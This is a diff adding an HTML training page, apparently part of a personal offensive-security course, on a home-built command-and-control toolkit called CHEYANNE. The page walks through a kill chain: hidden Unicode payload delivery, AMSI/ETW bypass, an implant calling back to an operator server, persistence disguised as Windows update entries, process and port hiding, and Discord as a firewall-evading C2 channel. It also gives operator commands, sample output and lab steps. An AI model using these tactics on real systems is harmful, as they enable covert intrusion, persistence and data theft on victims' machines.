@@ -1,0 +1,211 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Module 16 — Command &amp; Control</title>
+<style>
+  :root{--bg:#0c0c0c;--fg:#cccccc;--green:#0f0;--red:#f44;--yellow:#ff0;--cyan:#0ff;--magenta:#f0f;--prompt:#0f0;}
+  *{box-sizing:border-box;margin:0;padding:0;}
+  body{background:var(--bg);color:var(--fg);font-family:'Segoe UI',Tahoma,sans-serif;font-size:15px;line-height:1.7;padding:20px;}
+  .container{max-width:1000px;margin:0 auto;}
+  .header{text-align:center;margin-bottom:40px;padding-bottom:30px;border-bottom:2px solid #333;}
+  .header h1{color:var(--magenta);font-size:32px;text-transform:uppercase;letter-spacing:4px;margin-bottom:10px;}
+  .header .subtitle{color:#666;font-size:16px;}
+  .section{margin-bottom:40px;padding:25px;background:#111;border:1px solid #222;border-radius:8px;}
+  .section-title{color:var(--yellow);font-size:20px;text-transform:uppercase;letter-spacing:2px;margin-bottom:20px;padding-left:15px;border-left:4px solid var(--yellow);}
+  .section-content{color:#bbb;}
+  .section-content p{margin-bottom:15px;}
+  .code-block{background:#0a0a0a;border:1px solid #333;border-radius:6px;padding:15px;margin:15px 0;font-family:'Consolas','Courier New',monospace;font-size:13px;overflow-x:auto;}
+  .code-block .prompt{color:var(--magenta);}
+  .code-block .command{color:var(--fg);}
+  .code-block .output{color:#888;margin-top:8px;padding-left:20px;}
+  .code-block .hi{color:var(--cyan);}
+  .code-block .warn{color:#ffb000;}
+  .code-block .ok{color:var(--green);}
+  .code-block .critical{color:var(--red);font-weight:bold;}
+  .note{background:#1a1a1a;border-left:4px solid var(--magenta);padding:15px;margin:20px 0;color:var(--magenta);font-style:italic;}
+  .arch-diagram{background:#0a0a0a;border:1px solid #333;border-radius:4px;padding:20px;margin:15px 0;font-family:'Consolas',monospace;font-size:12px;line-height:2;color:#777;overflow-x:auto;}
+  .widget-container{margin:40px 0;border:2px solid #333;border-radius:8px;overflow:hidden;}
+  .widget-header{background:#1a1a1a;padding:15px;text-align:center;color:var(--magenta);font-size:18px;text-transform:uppercase;letter-spacing:2px;border-bottom:1px solid #333;}
+  .widget-iframe{width:100%;height:560px;border:none;background:#000;}
+  .nav{display:flex;justify-content:space-between;margin-top:40px;padding-top:20px;border-top:1px solid #333;}
+  .nav a{color:var(--green);text-decoration:none;padding:10px 20px;border:1px solid var(--green);border-radius:4px;transition:all .3s;}
+  .nav a:hover{background:var(--green);color:#000;}
+  .quick-ref{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin-top:20px;}
+  .quick-ref-item{background:#1a1a1a;padding:12px;border-radius:4px;border-left:3px solid var(--magenta);}
+  .quick-ref-cmd{color:var(--magenta);font-weight:bold;font-family:'Consolas',monospace;font-size:12px;}
+  .quick-ref-desc{color:#888;font-size:12px;margin-top:4px;}
+  .kill-chain{display:flex;flex-direction:column;gap:2px;margin:15px 0;}
+  .kc-row{display:grid;grid-template-columns:140px 1fr;gap:8px;}
+  .kc-label{background:#0a0a0a;border:1px solid #222;padding:8px 12px;color:#555;font-size:11px;text-transform:uppercase;letter-spacing:1px;}
+  .kc-label span{display:block;font-size:13px;font-weight:bold;margin-top:2px;}
+  .kc-content{background:#0a0a0a;border:1px solid #222;padding:8px 12px;color:#888;font-size:12px;font-family:'Consolas',monospace;}
+  .kc-content .tool{color:var(--cyan);}
+  .kc-content .status{float:right;font-size:10px;letter-spacing:1px;padding:2px 6px;border:1px solid;display:inline-block;}
+  .kc-content .status.pass{border-color:var(--green);color:var(--green);}
+</style>
+</head>
+<body>
+<div class="container">
+  <div class="header">
+    <h1>Module 16 — Command &amp; Control</h1>
+    <div class="subtitle">CHEYANNE: full kill chain built from first principles. Delivery → execution → C2 → persistence. 0 detections.</div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 1: What a C2 Framework Is</div>
+    <div class="section-content">
+      <p>A C2 (Command and Control) framework is the operator's interface to a compromised machine. The implant (payload on target) calls back to the C2 server. The operator sends commands, receives output. Everything encrypted, jittered, over normal-looking traffic.</p>
+      <div class="arch-diagram">
+[TARGET MACHINE]                                    [OPERATOR — .92]
+  iron_sun.exe (implant)                              vader_c2_v2.py
+    ↓ TCP connect out to 192.168.1.92:4443              ↑ accepts connection
+    ↓ magic bytes → handshake                           ↑ session opens
+    ↓ sleep(jitter) → anti-behavioural              chey&gt; shell whoami
+    ↓ recv command                                  chey&gt; screenshot
+    ↓ exec via cmd.exe (hidden)                     chey&gt; persist
+    ↓ send output                                   chey&gt; migrate PID
+    ↓ reconnect loop (if dropped)                       ↑ all output streams back
+
+Evasion active: DARK ROOM (AMSI+ETW blind), XOR enc, jitter, ISUN gate</div>
+      <p>The implant never opens a visible window. The C2 port (4443) looks like HTTPS to network monitors. Jitter randomises beacon timing so it doesn't look like a heartbeat.</p>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 2: CHEYANNE Full Kill Chain</div>
+    <div class="section-content">
+      <div class="kill-chain">
+        <div class="kc-row">
+          <div class="kc-label">PHASE 1<span style="color:var(--cyan)">Delivery</span></div>
+          <div class="kc-content"><span class="tool">ghost_encoder.py</span> — payload hidden in zero-width Unicode<br>Target opens document, pastes text → invisible payload extracted<br><span class="status pass">PASS</span></div>
+        </div>
+        <div class="kc-row">
+          <div class="kc-label">PHASE 2<span style="color:var(--cyan)">Execution</span></div>
+          <div class="kc-content"><span class="tool">dark_room.exe</span> — HWBP AMSI+ETW bypass<br>AmsiScanBuffer blind. ETW blind. Zero memory writes.<br><span class="status pass">PASS</span></div>
+        </div>
+        <div class="kc-row">
+          <div class="kc-label">PHASE 3<span style="color:var(--cyan)">C2 Connect</span></div>
+          <div class="kc-content"><span class="tool">iron_sun.exe</span> → TCP 4443 → <span class="tool">vader_c2_v2.py</span><br>Session open. Bidirectional. Jitter active. Port 4443 = HTTPS-alt.<br><span class="status pass">PASS</span></div>
+        </div>
+        <div class="kc-row">
+          <div class="kc-label">PHASE 4<span style="color:var(--cyan)">Recon</span></div>
+          <div class="kc-content"><span class="tool">winrecon.ps1</span> via shell — full system fingerprint<br>CRITICAL: Tamper Protection OFF. SeDebugPrivilege ENABLED.<br><span class="status pass">PASS</span></div>
+        </div>
+        <div class="kc-row">
+          <div class="kc-label">PHASE 5<span style="color:var(--cyan)">Persistence</span></div>
+          <div class="kc-content"><span class="tool">persist</span> command — registry + scheduled task + startup LNK<br>Survives reboot. Three vectors. One auto-removed on eviction.<br><span class="status pass">PASS</span></div>
+        </div>
+        <div class="kc-row">
+          <div class="kc-label">PHASE 6<span style="color:var(--cyan)">Evasion</span></div>
+          <div class="kc-content"><span class="tool">cloak.dll</span> — hide process, hide port, hide file from OS APIs<br>GetTcpTable2 returns 4443 as closed. TaskManager shows nothing.<br><span class="status pass">PASS</span></div>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 3: The Operator Console</div>
+    <div class="section-content">
+      <div class="code-block">
+        <span class="prompt">chey&gt;</span> <span class="command">help</span><br>
+        <div class="output">
+          shell &lt;cmd&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Execute shell command on target<br>
+          screenshot&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Capture target screen<br>
+          upload &lt;file&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Drop file to target<br>
+          download &lt;path&gt;&nbsp;&nbsp;&nbsp;Pull file from target<br>
+          persist&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Install all 3 persistence vectors<br>
+          migrate &lt;PID&gt;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Migrate session to another process<br>
+          cloak&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Hide process + port + files<br>
+          kill&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Terminate implant and clean up<br>
+          back&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Return to session list
+        </div>
+      </div>
+      <div class="code-block">
+        <span class="prompt">chey&gt;</span> <span class="command">shell whoami && shell whoami /priv | findstr Enabled</span><br>
+        <div class="output">
+          laptop-r32m8mli\gwu07<br>
+          <span class="ok">SeDebugPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled</span><br>
+          <span class="warn">SeImpersonatePrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled</span><br>
+          <span class="warn">SeLoadDriverPrivilege&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Enabled</span>
+        </div>
+      </div>
+      <div class="code-block">
+        <span class="prompt">chey&gt;</span> <span class="command">persist</span><br>
+        <div class="output">
+          <span class="ok">[+] HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run → svchost_update.exe</span><br>
+          <span class="ok">[+] Scheduled task → "Windows Update Helper" → runs at logon</span><br>
+          <span class="ok">[+] Startup LNK → C:\Users\gwu07\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\</span><br>
+          <span class="hi">[+] All 3 vectors active. Kill one, two survive.</span>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Section 4: Discord as Backup C2</div>
+    <div class="section-content">
+      <p>TCP C2 requires port 4443 open from target to operator. Discord C2 uses HTTPS to Discord's CDN — port 443, to an IP owned by Discord. Bypasses every corporate firewall.</p>
+      <div class="code-block">
+        <span class="prompt">#</span> <span class="command">Discord C2 flow</span><br>
+        <div class="output">
+          # Implant polls Discord channel every 15s (with jitter)<br>
+          GET https://discord.com/api/channels/&lt;id&gt;/messages<br>
+          # Operator types command in Discord: !cmd whoami<br>
+          # Implant executes, POSTs output back to channel<br>
+          # Firewall sees: HTTPS to discord.com — always allowed<br><br>
+          <span class="warn"># Limitation: command latency = poll interval (15s)</span><br>
+          <span class="hi"># Use TCP C2 when you can. Use Discord when TCP is blocked.</span>
+        </div>
+      </div>
+      <div class="note">Both transports tested and operational. TCP for interactive sessions, Discord for environments with outbound filtering. Same implant, different transport — swap with a config flag.</div>
+    </div>
+  </div>
+
+  <div class="widget-container">
+    <div class="widget-header">CHEYANNE Kill Chain Tracker</div>
+    <iframe class="widget-iframe" src="../widgets/killchain_widget.html" title="CHEYANNE Kill Chain"></iframe>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Quick Reference</div>
+    <div class="section-content">
+      <div class="quick-ref">
+        <div class="quick-ref-item"><div class="quick-ref-cmd">python vader_c2_v2.py</div><div class="quick-ref-desc">Start C2 listener</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">chey&gt; shell &lt;cmd&gt;</div><div class="quick-ref-desc">Execute on target</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">chey&gt; persist</div><div class="quick-ref-desc">3-vector persistence</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">chey&gt; cloak</div><div class="quick-ref-desc">Hide from OS</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">chey&gt; screenshot</div><div class="quick-ref-desc">Screen capture</div></div>
+        <div class="quick-ref-item"><div class="quick-ref-cmd">chey&gt; migrate PID</div><div class="quick-ref-desc">Move to another process</div></div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section">
+    <div class="section-title">Lab: Full Kill Chain on Your Lab</div>
+    <div class="section-content">
+      <div class="code-block">
+        # .92 = C2 server (operator machine)<br>
+        # .42 = target (WUPC)<br><br>
+        1.  cd C:\Users\gwu07\Desktop\repos\cheyanne\<br>
+        2.  python vader_c2_v2.py  ← C2 listener starts<br>
+        3.  On .42: compile iron_sun with .92 IP baked in<br>
+        4.  On .42: run .\iron_sun.exe<br>
+        5.  .92 console: session opens — chey&gt; prompt appears<br>
+        6.  chey&gt; shell whoami<br>
+        7.  chey&gt; shell .\winrecon.ps1<br>
+        8.  chey&gt; persist<br>
+        9.  Reboot .42 — verify all 3 persistence vectors survive<br>
+        10. chey&gt; cloak → check .42 Task Manager for iron_sun process
+      </div>
+    </div>
+  </div>
+
+  <div class="nav">
+    <a href="MODULE_11_AMSI.html">← Module 11: AMSI</a>
+    <a href="MODULE_21_MOBILE.html">Module 21: Mobile →</a>
+  </div>
+</div>
+</body>
+</html>
